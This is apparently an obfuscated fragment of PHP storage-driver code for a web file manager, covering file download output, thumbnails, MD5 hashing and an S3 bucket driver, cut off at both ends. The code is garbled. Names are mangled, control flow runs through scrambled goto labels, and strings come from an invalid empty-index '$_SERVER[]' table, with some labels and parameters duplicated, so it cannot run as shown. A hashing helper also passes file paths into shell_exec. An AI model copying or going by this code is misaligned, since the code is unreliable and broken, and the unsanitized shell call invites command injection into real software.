AҐ碸; D˿: $d٘䅉 =& $_SERVER[]; if (!$D᪓) { return md5($d٘䅉[33]); } $D = $this->size($D᪓); goto e; eŖ: } public static $md5Cache = array(); public function hashMd5($A) { $A = $this->iconvSystem($A); if (isset(self::$md5Cache[$A])) { return self::$md5Cache[$A]; } self::$md5Cache[$A] = $this->hashMd5Shell($A); if (!self::$md5Cache[$A]) { self::$md5Cache[$A] = @md5_file($A); } return self::$md5Cache[$A]; } private function hashMd5Shell($bïğ) { goto c; c: $aφ =& $_SERVER[]; if (!function_exists($aφ[97])) { return !1; } $C = array($aφ[98], $aφ[99]); goto d٩; d٩: $C旎 = Cache::get($aφ[100]); if (!$C旎) { $eȺ = BASIC_PATH . $aφ[101]; $F͈ = md5_file($eȺ); $C旎 = $aφ[102]; foreach ($C as $FĚ) { $Eԥ = shell_exec($FĚ . "\40\42{$eȺ}\x22"); if ($Eԥ && substr(trim($Eԥ), 0, 32) == $F͈) { $C旎 = $FĚ; break; } } Cache::set($aφ[100], $C旎, 3600); } if ($C旎 == $aφ[102]) { return !1; } goto e; e: $Eԥ = shell_exec($C旎 . "\x20\42{$bïğ}\42"); $Eԥ = str_replace($aφ[103], $aφ[33], $Eԥ); return substr($Eԥ, 0, 32); goto Eس; Eس: } public function link($f) { return $f; } public function fileOut($B, $B馵 = false, $B = false, $fŏ = '') { goto Aۃ; C巐߈: if ($_SERVER[$F[156]] == $F[157]) { return; } $B = 1024 * 100; $CƲ = 0; goto EҪ; EҪ: if ($a) { $CƲ = intval(1000 * 1000 * ($B / $a)); } while ($f须 <= $B) { $c = timeFloat(); check_abort(); $b㏆ = $B - $f须 + 1; if ($b㏆ <= $B) { $B = $b㏆; } echo $this->fileSubstr($B, $f须, $B); $f须 += $B; if ($B == $b㏆) { $f须 = $B + 1; } if ($CƲ) { $c = intval(1000 * 1000 * (timeFloat() - $c)); $a׫ = $CƲ - $c; if ($a׫ > 5) { usleep($a׫); } } } goto Eʃ; F: $f须 = 0; $B = $b - 1; $BҩЙ = $this->ext($Bޮ); goto B; bʒ: $E = strtolower($_SERVER[$F[141]]); if ($fĄ && $E && $E즖) { if (strstr($E, $F[142])) { header($F[143] . $B); } else { if (strstr($E, $F[144])) { header($F[145] . $B); } else { if (strstr($E, $F[146])) { header($F[147] . $B); } } } if ($a) { header($F[148] . $a); } return; } if (isset($_SERVER[$F[149]])) { if (preg_match($F[150], $_SERVER[$F[149]], $Dϥ)) { $f须 = intval($Dϥ[1]); if (!empty($Dϥ[2])) { $B = intval($Dϥ[2]); } } header($F[151]); header("\x43\x6f\156\164\145\x6e\x74\x2d\x52\x61\x6e\147\145\x3a\40\x62\x79\164\x65\163\x20{$f须}\x2d{$B}\x2f" . $b); } else { header($F[152]); } goto B˱; B: $e = get_file_mime($BҩЙ); if (strstr($e, $F[116])) { $e = $e . $F[117]; } if ($B馵 === !1 && !mime_support($e)) { $B馵 = !0; $e = $F[118]; } goto Fαޣϻ; EΧބ: @ob_end_clean(); set_timeout(); $c = $this->infoFull($B); goto b˙; b˙: $b = $c[$F[77]]; $c޴ = gmdate($F[109], $c[$F[83]]); $Bޮ = $B ? $B : $this->iconvApp($c[$F[28]]); goto F; aЬ: $A拷 = $F[115] . $A拷 . $F[121] . $A拷; if ($B馵) { header($F[122]); header($F[123] . $A拷); } else { header($F[124] . $A拷); } header($F[125] . gmdate($F[109], time() + 3600 * 24 * 30) . $F[126]); goto E; e: header($F[134] . $c޴ . $F[126]); header($F[135] . $Bޮ); header($F[136]); goto a; E: header($F[127]); header($F[128]); header($F[129]); goto Eܲ; Aۃ: $F =& $_SERVER[]; $this->cacheMethod(null, null); if (!$B || !$this->exist($B)) { show_json(LNG($F[104]), !1, $B); } goto EĢ˻; EĢ˻: $fĄ = $this->getType() == $F[105]; $E즖 = $GLOBALS[$F[6]][$F[87]][$F[106]][$F[107]]; $a = (double) $GLOBALS[$F[6]][$F[87]][$F[106]][$F[108]] * 1024 * 1024; goto EΧބ; B: if (in_array($BҩЙ, array($F[110], $F[111], $F[112], $F[113]))) { $BҩЙ = $F[114]; } if (!$fŏ) { $fŏ = md5($c޴ . $this->hashSimple($B)); } $fŏ = $F[115] . $fŏ . $F[115]; goto B; B˱: $cԻ = !0; if ($_SERVER[$F[153]] == $F[154] && $b > 1204 * 1024 * 1024 * 2) { $cԻ = !1; } if ($cԻ) { header($F[155] . ($B - $f须 + 1)); } goto C巐߈; Eܲ: if (isset($_SERVER[$F[130]]) && strtotime($_SERVER[$F[130]]) == $c[$F[83]]) { header($F[131], !0, 304); die; } if (isset($_SERVER[$F[132]]) && $_SERVER[$F[132]] == $fŏ) { header($F[133] . $fŏ, !0, 304); die; } header($F[133] . $fŏ); goto e; a: header($F[137] . $b); header($F[138]); if (!$B馵 && $BҩЙ == $F[139]) { if ($b > 1024 * 1024 * 5) { die; } $eڞ = $this->getContent($B); $eڞ = Html::clearSVG($eڞ); header($F[140] . strlen($eڞ)); echo $eڞ; die; } goto bʒ; Fαޣϻ: header($F[119]); header($F[120] . $e); $A拷 = rawurlencode($Bޮ); goto aЬ; Eʃ: } public function fileOutServer($Aۃ, $eﮊ = false, $e = false, $e􎍦 = '') { $this->fileOut($Aۃ, $eﮊ, $e, $e􎍦); } public function fileOutLink($F߾) { header($_SERVER[][158] . $F߾); die; } public function cacheMethod($e, $e쟍, $bą = null) { goto Dҫ謁; Dҫ謁: $b߄ =& $_SERVER[]; static $aӅ = array(); $FۈӬ = $e쟍 ? ltrim($this->getPathOuter($e쟍), $b߄[8]) : $e쟍; goto E; E: $Až = $b߄[159] . $e . $b߄[160] . rtrim($FۈӬ, $b߄[8]); if (is_null($e)) { $aӅ = array(); return; } if (is_null($e쟍)) { unset($aӅ[$Až]); return; } goto cٛ; B: $cٽ = $this->{$e}($e쟍); $aӅ[$Až] = $cٽ; return $cٽ; goto a˧ˏ; cٛ: if (!is_null($bą)) { $aӅ[$Až] = $bą; return; } $cٽ = isset($aӅ[$Až]) ? $aӅ[$Až] : null; if (!is_null($cٽ)) { return $cٽ; } goto B; a˧ˏ: } public function fileOutImage($E쳎, $fϵ܌ = 250) { goto Aך뷚; Bڅ: IO::fileOut($B ); goto BʉϏ; F: if ($D[$B[77]] <= 1024 * 50 || $B || !function_exists($B[166]) || $D[$B[167]] == $B[168]) { return $this->fileOut($E쳎, !1, $CՕ); } if (isset($D[$B[163]][$B[169]])) { $Aʟ = $D[$B[163]][$B[169]]; } else { if (isset($D[$B[163]][$B[170]])) { $Aʟ = $D[$B[163]][$B[170]]; } else { $Aʟ = md5("{$D[$B[28]]}\x5f{$D[$B[75]]}\137{$D[$B[77]]}"); } } $eߺ = "{$Aʟ}\x5f{$fϵ܌}\x2e\160\x6e\147"; goto fԇ; cӒ: $E = DATA_THUMB . $eߺ; del_file($E); if (!@file_exists($E)) { $eӏ؏ = TEMP_FILES; if (!is_dir($eӏ؏)) { mk_dir($eӏ؏); } $BФ = $eӏ؏ . $Aʟ . $B[94] . $D[$B[167]]; if (!@file_exists($BФ)) { $BФ = $this->download($E쳎, $BФ); } $eض = new ImageThumb($BФ, $B[173]); $eض->prorate($E, $fϵ܌, $fϵ܌ * 10); } goto Cءڸ; fԇ: if (!($A쇞ϝ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $B[171]))) { $B׋ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $B[172]); } else { $B׋ = KodIO::make($A쇞ϝ); } if ($A쇞ϝ = IO::fileNameExist($B׋, $eߺ)) { $E = KodIO::make($A쇞ϝ); return IO::fileOut($E, !1, $CՕ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto cӒ; cݍ: $CՕ = $D[$B[28]]; $B = !1; if (isset($GLOBALS[$B[161]]) && $GLOBALS[$B[161]][$B[75]] == $D[$B[75]]) { $F = $GLOBALS[$B[161]][$B[162]]; if (!$D[$B[163]]) { $D[$B[163]] = $GLOBALS[$B[161]]; } if (isset($F[$B[164]])) { if ($F[$B[164]] <= $fϵ܌ && $F[$B[165]] <= $fϵ܌) { $B = !0; } } $CՕ = $D[$B[163]][$B[28]]; } goto F; Cءڸ: if (!file_exists($E) || filesize($E) < 100) { return @file_exists($BФ) ? IO::fileOut($BФ) : $this->fileOut($E쳎); } if (!($B  = IO::move($E, $B׋))) { return IO::fileOut($E); } del_file($E); goto Bڅ; Aך뷚: $B =& $_SERVER[]; if (substr($E쳎, 0, 4) == $B[146]) { $this->fileOutLink($E쳎); } $D = $this->info($E쳎); goto cݍ; BʉϏ: } public function fileOutImageServer($E㬩, $Dۗ = 250) { $this->fileOutImage($E㬩, $Dۗ); } public function fileNameAuto($a򼄊, $B, $D؅ = REPEAT_RENAME, $BϷ = false) { goto D㝐; aݳ: if ($D؅ == REPEAT_SKIP) { return !1; } $D = $f[94] . get_path_ext($B); $D = $D == $f[94] || $BϷ ? $f[33] : $D; goto d; d: $CҶ = 1; $AΝݗ = substr($B, 0, strlen($B) - strlen($D)); $b = $AΝݗ . "\x28{$CҶ}\51{$D}"; goto d˛; d˛: while ($this->exist(rtrim($a򼄊, $f[8]) . $f[8] . $b)) { $b = $AΝݗ . "\50{$CҶ}\x29{$D}"; $CҶ++; } return $b; goto D; D㝐: $f =& $_SERVER[]; $fӼ = $a򼄊 === $f[33] ? $B : rtrim($a򼄊, $f[8]) . $f[8] . $B; if ($D؅ == REPEAT_REPLACE || !$this->exist($fӼ) || $BϷ && $D؅ != REPEAT_RENAME_FOLDER) { return $B; } goto aݳ; D: } private function fileNameAutoList($dԻ, $eܒ, $AĚ = false) { goto eҹ; a˭: return $bи; goto Bꮈ; eҹ: $DÍ =& $_SERVER[]; $E = $this->listPath($dԻ, !0); $E = array_merge($E[$DÍ[74]], $E[$DÍ[73]]); goto C˥愇; FΈ콂: $b = substr($eܒ, 0, strlen($eܒ) - strlen($C)); $bи = $b . "\x28\60\x29{$C}"; for ($Dъ = 1; $Dъ <= count($E) + 1; $Dъ++) { $bи = $b . "\50{$Dъ}\x29{$C}"; if (!in_array_not_case($bи, $E)) { return $bи; } } goto a˭; C˥愇: $E = array_to_keyvalue($E, $DÍ[33], $DÍ[28]); $C = $DÍ[94] . get_path_ext($eܒ); $C = $C == $DÍ[94] || $AĚ ? $DÍ[33] : $C; goto FΈ콂; Bꮈ: } public function listAllFiles($f, $A, $a٘ = array()) { goto d; fߙ: $f = trim($f, $Eήꦰ[8]); foreach ($A as $F䘝) { $C䕺 = ltrim(substr(trim($F䘝, $Eήꦰ[8]), strlen($f)), $Eήꦰ[8]); $D = array_merge($D, $this->slicePath($C䕺)); } $c猉 = array(); goto A; A: foreach (array_unique($D) as $F䘝) { $D톮 = array($Eήꦰ[75] => $this->getPathOuter($Eήꦰ[8] . $f . $Eήꦰ[8] . $F䘝), $Eήꦰ[76] => 1, $Eήꦰ[77] => 0); if (substr($F䘝, -1) != $Eήꦰ[8]) { $D톮[$Eήꦰ[76]] = 0; $fӔ = $this->getPath($f . $Eήꦰ[8] . $F䘝); $D톮[$Eήꦰ[77]] = isset($a٘[$fӔ]) ? $a٘[$fӔ] : $this->size($fӔ); } $c猉[] = $D톮; } return $c猉; goto FǛҨ; d: $Eήꦰ =& $_SERVER[]; if (empty($A)) { return array(); } $D = array(); goto fߙ; FǛҨ: } public function slicePath($eэ) { $dƳ =& $_SERVER[]; $A҂ = explode($dƳ[8], trim($eэ, $dƳ[8])); $b泞 = 0; do { ++$b泞; $Eㄭ[] = implode($dƳ[8], array_slice($A҂, 0, $b泞)) . $dƳ[8]; } while ($b泞 < count($A҂)); $Eㄭ[count($A҂) - 1] = $eэ; return $Eㄭ; } public function getHost() { $A料ݭ =& $_SERVER[]; $a = parse_url(trim($this->domain, $A料ݭ[8])); $a = isset($a[$A料ݭ[174]]) ? $a[$A料ݭ[174]] : http_type(); $B򛏪 = isset($a[$A料ݭ[175]]) ? $a[$A料ݭ[175]] : $a[$A料ݭ[75]]; if (isset($a[$A料ݭ[176]])) { $B򛏪 .= $A料ݭ[4] . $a[$A料ݭ[176]]; } return $a . $A料ݭ[177] . $B򛏪; } public function pathEncode($Dȑ솷) { $f =& $_SERVER[]; return str_replace($f[178], $f[8], rawurlencode($Dȑ솷)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($e錌֟ϭ) { set_timeout(); require_once SDK_DIR . $_SERVER[][179]; parent::__construct(); $this->_init($e錌֟ϭ); } public function _init($eʱ) { foreach ($eʱ as $bߕ => $bĝ) { if (isset($this->{$bߕ})) { $this->{$bߕ} = $bĝ; } } $this->endpoint = $eʱ[$_SERVER[][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Bܰ = "\166\x34") { $this->signVer = $Bܰ; $this->client->setSignatureVersion($Bܰ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto f˞Ƀ; c򉤜: $cͼ = array($eȑ[186], $eȑ[187], $eȑ[188], $eȑ[189], $eȑ[190]); $dð = array_diff($cͼ, $E󕇔); return empty($dð); goto F蓼; f˞Ƀ: $eȑ =& $_SERVER[]; $aʊ = $this->getBucketCors(); if (!$aʊ || !is_array($aʊ)) { return !1; } goto A; A: if ($aʊ[$eȑ[181]] != $eȑ[182] || $aʊ[$eȑ[183]] != $eȑ[182]) { return !1; } $E󕇔 = array_map($eȑ[184], $aʊ[$eȑ[185]]); if (!is_array($E󕇔)) { $E󕇔 = array(); } goto c򉤜; F蓼: } public function mkfile($dŅ, $b = '', $F͐ = REPEAT_RENAME) { $cߞ = $this->setContent($dŅ, $b); if ($cߞ !== !1) { return $this->getPathOuter($dŅ); } return !1; } public function mkdir($a, $Dε = REPEAT_SKIP) { if (empty($a)) { return !1; } if ($this->_isFolder($a)) { return $this->getPathOuter($a); } $EՄ = $this->setContent($a, $_SERVER[][33], !0); if ($EՄ !== !1) { return $this->getPathOuter($a); } return !1; } public function copyFile($Dۍ̂, $c뱈, $C͗ = array()) { $Eƾܣ =& $_SERVER[]; $cݰ = $this->objectMeta($Dۍ̂); if (!$cݰ) { return !1; } if ($cݰ[$Eƾܣ[77]] <= 1024 * 1024 * 200) { $c۠ = $this->client->copyObject($this->bucket, $Dۍ̂, $this->bucket, $c뱈, $Eƾܣ[191], $C͗); } else { $c۠ = $this->client->multiCopyObject($this->bucket, $Dۍ̂, $this->bucket, $c뱈, $C͗); } $c۠ = $c۠ ? $this->getPathOuter($c뱈) : !1; return $c۠; } public function moveFile($Fϰ, $d) { if ($this->copyFile($Fϰ, $d)) { $this->delFile($Fϰ); return $this->getPathOuter($d); } return !1; } public function delFile($C) { return $this->client->deleteObject($this->bucket, $C); } public function delFolder($d) { goto B; B: $Eϡ =& $_SERVER[]; if (!$this->exist($d)) { return !0; } $this->listItemCache = !1; goto bѺ̞; bѺ̞: $c핇 = $this->fileList($d); $this->listItemCache = !0; $aÌ܌ = trim($d, $Eϡ[8]) . $Eϡ[8]; goto Cόҝ; bƣơ: return $this->delByBatch($c핇[$Eϡ[74]]); goto c׾ᣞ; Cόҝ: if (!empty($d) && !in_array($aÌ܌, $c핇[$Eϡ[74]])) { $c핇[$Eϡ[74]][] = $aÌ܌; } $AؗՉ = $this->delByBatch($c핇[$Eϡ[73]]); if (!$AؗՉ) { return !1; } goto bƣơ; c׾ᣞ: } private function delByBatch($e뉿) { foreach (array_chunk($e뉿, 1000) as $Eͻߚ) { $C֏ = $this->client->deleteObjects($this->bucket, $Eͻߚ); if (!$C֏) { return !1; } } return !0; } public function rename($F׃ܡٗ, $B) { return $this->renameObject($F׃ܡٗ, $B); } public function listPath($dٱ, $Fϥ = false) { $b팦 =& $_SERVER[]; $Fٵ = $this->fileList($dٱ, $b팦[8], !0); foreach ($Fٵ[$b팦[74]] as $b => $AǕ) { $Fٵ[$b팦[74]][$b] = $this->folderInfo($AǕ, $Fϥ); } foreach ($Fٵ[$b팦[73]] as $b => $AǕ) { $Fٵ[$b팦[73]][$b] = $this->fileInfo($AǕ[$b팦[28]], $Fϥ, $AǕ); } return $Fٵ; } private function fileInfo($Eأ, $cу = false, $eٛ = array()) { goto F; F: $f =& $_SERVER[]; $F = array($f[28] => $this->pathThis($Eأ), $f[75] => $this->getPathOuter($Eأ), $f[29] => $f[173], $f[167] => $this->ext($Eأ), $f[77] => isset($eٛ[$f[77]]) ? $eٛ[$f[77]] : 0); if ($cу) { return $F; } goto D罱; C: if (isset($eٛ[$f[195]])) { $F[$f[83]] = $eٛ[$f[195]]; } if (isset($eٛ[$f[77]])) { $F[$f[77]] = $eٛ[$f[77]]; } return $F; goto C; D罱: $F[$f[192]] = $F[$f[83]] = 0; $F[$f[193]] = $F[$f[194]] = !0; if (empty($eٛ)) { $eٛ = $this->objectMeta($Eأ); if (!$eٛ) { return $F; } } goto C; C: } private function folderInfo($F˼ރ, $c놝 = false) { goto B; eڌ: $F˼ރ = trim($F˼ރ, $fɃ[8]) . $fɃ[8]; $eΆߪ = $this->objectMeta($F˼ރ); if (isset($eΆߪ[$fɃ[195]])) { $d˃[$fɃ[192]] = $eΆߪ[$fɃ[195]]; } goto eٰ; Fﮃ: $d˃[$fɃ[192]] = $d˃[$fɃ[83]] = 0; $d˃[$fɃ[193]] = $d˃[$fɃ[194]] = !0; if ($F˼ރ == $fɃ[33]) { return $d˃; } goto eڌ; eٰ: return $d˃; goto fؾ; B: $fɃ =& $_SERVER[]; $d˃ = array($fɃ[28] => $this->pathThis($F˼ރ), $fɃ[75] => $this->getPathOuter($fɃ[8] . $F˼ރ), $fɃ[29] => $fɃ[76]); if ($c놝) { return $d˃; } goto Fﮃ; fؾ: } private function fileList($A銍, $DËϊ = '', $AЃ = 0) { goto eʼ; F: foreach ($EͶڙ[$Eˌ֑[196]] as $F) { goto Aߓ; Eɇ: $FƷ = $F == 0 && substr($D䏐, strlen($D䏐) - 1, 1) == $Eˌ֑[8] ? !0 : !1; if ($F) { $this->cacheMethod($Eˌ֑[197], $D䏐, $FƷ); $this->cacheMethod($Eˌ֑[198], $D䏐, $F); } if ($FƷ) { $dϓâ[] = $D䏐; continue; } goto B٭; B٭: $E[] = $AЃ ? $F : $D䏐; goto F㦬; Aߓ: $D䏐 = $F[$Eˌ֑[28]]; if ($D䏐 == $C) { continue; } $F = isset($F[$Eˌ֑[77]]) ? $F[$Eˌ֑[77]] : 0; goto Eɇ; F㦬: } foreach ($EͶڙ[$Eˌ֑[199]] as $F) { $dϓâ[] = $F[$Eˌ֑[28]]; if ($F) { $this->cacheMethod($Eˌ֑[197], $F[$Eˌ֑[28]], !0); } } if ($F) { $this->cacheMethod($Eˌ֑[197], $A銍, !0); } goto Aׅ; B: if (!$EͶڙ) { return array($Eˌ֑[74] => array(), $Eˌ֑[73] => array()); } $F = $this->listItemCache === !1 ? !1 : !0; $dϓâ = $E = array(); goto F; eʼ: $Eˌ֑ =& $_SERVER[]; $C = rtrim($A銍, $Eˌ֑[8]) . $Eˌ֑[8]; $EͶڙ = $this->listObjs($C, null, null, $DËϊ); goto B; Aׅ: return array($Eˌ֑[74] => $dϓâ, $Eˌ֑[73] => $E); goto b; b: } private function listObjs($Eֻ®۔, $B = null, $E = null, $Cա = null) { $b谄 =& $_SERVER[]; $Eֻ®۔ = trim($Eֻ®۔, $b谄[8]); $D̑ = empty($Eֻ®۔) ? $b谄[33] : $Eֻ®۔ . $b谄[8]; return $this->client->getBucket($this->bucket, $D̑, $B, $E, $Cա, !0); } public function has($DҮم, $F̊ = false, $e = true) { goto fƲ; f㌌: $C֠䄍 = null; $dǜ߲ = 500; $C特 = $A[8]; goto C᷅; Fʏ: return !1; goto CɌ; C᷅: $Aʇ = $b = array(); while (!0) { $AΪ؝Ў = $this->listObjs($DҮم, $C֠䄍, $dǜ߲, $C特); if (!$AΪ؝Ў) { break; } $C֠䄍 = $AΪ؝Ў[$A[200]]; $f = $AΪ؝Ў[$A[196]]; $dϓ = $AΪ؝Ў[$A[199]]; if (empty($f) && empty($dϓ)) { break; } if (count($f) == 1 && $f[0][$A[28]] == $C䋂) { break; } if ($F̊) { if (count($f)) { $f = array_column($f, $A[28]); $Aʇ = array_merge($Aʇ, $f); } if (count($dϓ)) { $dϓ = array_column($dϓ, $A[28]); $b = array_merge($b, $dϓ); } if ($C֠䄍 === null) { break; } continue; } if ($e) { if (!empty($f)) { if (count($f) > 1 || isset($f[0][$A[28]]) && $f[0][$A[28]] != $C䋂) { return !0; } } } else { if (!empty($dϓ)) { return !0; } } if ($C֠䄍 === null) { break; } } if ($F̊) { $Aʇ = array_diff($Aʇ, array($C䋂)); $Aʇ = count(array_unique($Aʇ)); $b = count(array_unique($b)); return array($A[201] => $Aʇ, $A[202] => $b); } goto Fʏ; fƲ: $A =& $_SERVER[]; $DҮم = trim($DҮم, $A[8]); $C䋂 = empty($DҮم) ? $A[33] : $DҮم . $A[8]; goto f㌌; CɌ: } public function listAll($aǰ) { $d =& $_SERVER[]; $BŬ = $this->fileList($aǰ, $d[33], !0); $B = array(); foreach ($BŬ[$d[73]] as $eī) { $B[$eī[$d[28]]] = $eī[$d[77]]; } foreach ($BŬ[$d[74]] as $eī) { if (is_string($eī)) { $B[$eī] = 0; } } return $this->listAllFiles($aǰ, array_keys($B), $B); } public function canRead($aǒ) { $c =& $_SERVER[]; $dԾ = $this->client->getAccessControlPolicy($this->bucket, $aǒ); if (!$dԾ) { return !1; } return in_array($dԾ, array($c[203], $c[204], $c[205])) ? !0 : !1; } public function canWrite($E󲛾ꚜ) { $E୭ =& $_SERVER[]; $d = $this->client->getAccessControlPolicy($this->bucket, $E󲛾ꚜ); if (!$d) { return !1; } return in_array($d, array($E୭[203], $E୭[204])) ? !0 : !1; } public function getContent($E) { return $this->client->getObject($this->bucket, $E); } public function setContent($B̢, $D԰ = '', $D񞶅 = false) { goto Bó; cÇ: $E = $this->client->putObject($D԰, $this->bucket, $B̢, $B畲[191], array(), $Eă); if (!$E) { return !1; } if ($D񞶅) { return !0; } goto eѵ; Bó: $B畲 =& $_SERVER[]; $B̢ = $D񞶅 ? trim($B̢, $B畲[8]) . $B畲[8] : $B̢; $Eă = get_file_mime(get_path_ext($B̢)); goto cÇ; eѵ: $this->cacheMethod(null, null); $E = $this->copyFile($B̢, $B̢, array($B畲[206] => $E[$B畲[207]])); return $E ? !0 : !1; goto bȿ; bȿ: } public function fileSubstr($Eٳψ, $A, $D) { $d = $A + $D - 1; return $this->client->getObject($this->bucket, $Eٳψ, array($_SERVER[][208] => "\x62\171\x74\145\x73\x3d{$A}\x2d{$d}")); } public function upload($A, $d, $E = false, $Cױ = REPEAT_REPLACE) { $FѸ =& $_SERVER[]; $a˥ʑވ = array($FѸ[206] => @md5_file($d)); $fӥ = array($FѸ[209] => get_file_mime(get_path_ext($A))); if (IO::size($d) <= 1024 * 1024 * 200) { $C = $this->client->putObjectFile($d, $this->bucket, $A, $FѸ[191], $a˥ʑވ, $fӥ); return !empty($C) ? $this->getPathOuter($A) : !1; } $Bř = $this->client->multiUploadObject($d, $this->bucket, trim($A, $FѸ[8]), $a˥ʑވ, $fӥ); return $Bř ? $this->getPathOuter($A) : !1; } public function download($D, $cꚨ) { if (!@is_dir($this->pathFather($cꚨ)) && !IO::mkdir($this->pathFather($cꚨ))) { return !1; } $bԏȢ = $this->client->getObject($this->bucket, $D, array(), $cꚨ); return $bԏȢ !== !1 ? $cꚨ : !1; } public function link($f֤, $C碋߹ = array()) { $F° =& $_SERVER[]; if ($this->signVer == $F°[210]) { return $this->client->getAuthenticatedURL($this->bucket, $f֤, 3600 * 12, $C碋߹); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($f֤, $F°[8]), 3600 * 12, $this->region, array(), !0, $C碋߹); } public function fileOut($c, $aן = false, $A = false, $c = '') { goto F; Cۓ: $Eֿ = get_file_mime(get_path_ext($A)); if ($Eֿ == $E[211]) { return parent::fileOut($c, $aן, $A, $c); } $aן = $aן ? $E[212] : $E[213]; goto cڨ˷; cڨ˷: $A = array($E[214] => $aן . $E[215] . rawurlencode($A), $E[216] => $Eֿ); $D = $this->link($c, $A); $this->fileOutLink($D); goto c; F: $E =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($c, $aן, $A, $c); } if (!$A) { $A = $this->pathThis($c); } goto Cۓ; c: } public function fileOutServer($E, $E = false, $f = false, $Aʤ = '') { parent::fileOut($E, $E, $f, $Aʤ); } public function fileOutImageServer($EՅ, $Aû = 250) { parent::fileOutImage($EՅ, $Aû); } public function hashMd5($c, $c砈 = '') { $e܉ݛ =& $_SERVER[]; $aȦ = $this->objectMeta($c); if (!$aȦ) { return !1; } $c砈 = $c砈 ? $c砈 : _get($aȦ, $e܉ݛ[217]); $c砈 = $c砈 ? $c砈 : _get($aȦ, $e܉ݛ[207], $e܉ݛ[33]); return $c砈; } public function uploadFormData($Fݍ, $Cƣ = 3600) { $eϠݻݬ =& $_SERVER[]; $c郭 = $this->pathFather($Fݍ); $FӸ = $this->client->getHttpUploadPostParams($this->bucket, $c郭, $eϠݻݬ[191], $Cƣ); return array_merge((array) $FӸ, array($eϠݻݬ[175] => $this->getHost())); } public function multiUploadFormData($a, $A̓ȕ = 3600) { $A씡 =& $_SERVER[]; $D = gmdate($A씡[218]); $Eߎ = array(); $Fç = $this->client->getUploadId($this->bucket, $a, $Eߎ); if (!$Fç) { return !1; } return array($A씡[219] => $Fç, $A씡[175] => $this->getHost() . $A씡[8] . $this->pathEncode($a), $A씡[220] => $D, $A씡[92] => $a); } public function multiUploadAuthData($B, $e = array()) { goto d߄; cߊ񗏨: if (strpos($d߷Ӱ, $c֑ѣ[223]) === 0) { return array($c֑ѣ[230] => $C, $c֑ѣ[220] => $b̓ܮĄ); } return $C; goto B; d߄: $c֑ѣ =& $_SERVER[]; $b̓ܮĄ = isset($e[$c֑ѣ[220]]) ? $e[$c֑ѣ[220]] : gmdate($c֑ѣ[218]); $d߷Ӱ = isset($e[$c֑ѣ[167]]) ? $e[$c֑ѣ[167]] : $c֑ѣ[33]; goto aў؞; E: $bƹ = array($c֑ѣ[222], $c֑ѣ[33], $c֑ѣ[118], $c֑ѣ[33], "\170\x2d\x61\155\172\55\144\x61\x74\x65\x3a{$b̓ܮĄ}", $c֑ѣ[8] . $this->bucket . $c֑ѣ[8] . $this->pathEncode($B) . $d߷Ӱ); if (strpos($d߷Ӱ, $c֑ѣ[223]) === 0) { $bƹ[0] = $c֑ѣ[224]; } if (isset($e[$c֑ѣ[225]]) && $e[$c֑ѣ[225]] == $c֑ѣ[226]) { $bƹ[0] = $c֑ѣ[226]; } goto C; aў؞: $B = $e[$c֑ѣ[92]]; unset($e[$c֑ѣ[92]]); if (isset($e[$c֑ѣ[221]])) { $e[$c֑ѣ[220]] = $b̓ܮĄ; return $this->listUploadParts($B, $e); } goto E; C: $B츄 = implode($c֑ѣ[227], $bƹ); $d̓ = base64_encode(hash_hmac($c֑ѣ[228], $B츄, $this->secret, !0)); $C = $c֑ѣ[229] . $this->accessKey . $c֑ѣ[4] . $d̓; goto cߊ񗏨; B: } public function listUploadParts($F, $C懚 = array()) { goto d; d: $Cޣ =& $_SERVER[]; $F݅ = str_replace($Cޣ[231], $Cޣ[33], $C懚[$Cޣ[167]]); $b˪ = $this->client->listParts($this->bucket, $F, $F݅); goto e; bە: $d딆 = $this->multiUploadAuthData($F, $C懚); if (empty($d딆)) { return !1; } return array($Cޣ[230] => $d딆, $Cޣ[220] => $C懚[$Cޣ[220]], $Cޣ[232] => $b˪); goto cߝ; e: if (!$b˪) { return !1; } unset($C懚[$Cޣ[221]], $C懚[$Cޣ[225]]); $C懚[$Cޣ[92]] = $F; goto bە; cߝ: } public function getHost() { return parent::getHost() . $_SERVER[][8] . $this->bucket; } public function size($E) { $c = $this->objectMeta($E); return $c ? $c[$_SERVER[][77]] : 0; } public function info($b) { if ($this->isFolder($b)) { return $this->folderInfo($b); } else { if ($this->isFile($b)) { return $this->fileInfo($b); } } return !1; } public function exist($F«ϟ) { return $this->isFile($F«ϟ) || $this->isFolder($F«ϟ); } public function isFile($cߛ) { return !$this->isFolder($cߛ) && $this->objectMeta($cߛ); } public function isFolder($E) { return $this->cacheMethod($_SERVER[][197], $E); } protected function objectMeta($aƥԶ) { return $this->cacheMethod($_SERVER[][198], $aƥԶ); } protected function _objectMeta($Dو) { $F =& $_SERVER[]; $Dو = rtrim($Dو, $F[8]); try { $E = $this->client->getObjectInfo($this->bucket, $Dو); if (!isset($E[$F[217]]) && isset($E[$F[233]])) { $E[$F[217]] = $E[$F[233]]; } } catch (Exception $B󗭅) { $E = !1; } if (!$E) { } return $E; } protected function _isFolder($cȎ) { goto E; fñ: if (substr($Aձ, -1) == $Eɾ[8]) { return !0; } if (get_path_this($Aձ) == get_path_this($cȎ)) { return !1; } return !0; goto a; E: $Eɾ =& $_SERVER[]; $cȎ = rtrim($cȎ, $Eɾ[8]); if ($cȎ == $Eɾ[33] || $cȎ == $Eɾ[8]) { return !0; } goto eޯ; eޯ: $AЅ = $this->client->getBucket($this->bucket, $cȎ, null, 1); if (empty($AЅ[$Eɾ[196]])) { return !1; } $Aձ = $AЅ[$Eɾ[196]][0][$Eɾ[28]]; goto fñ; a: } } define($_SERVER[][234], 1); goto E֋; E߄: class PathDriverDriverShareItem { public function __construct($B论) { $this->pathParse = $B论; } public function __call($cȈ, $Fϝ) { $B =& $_SERVER[]; if (method_exists($this, 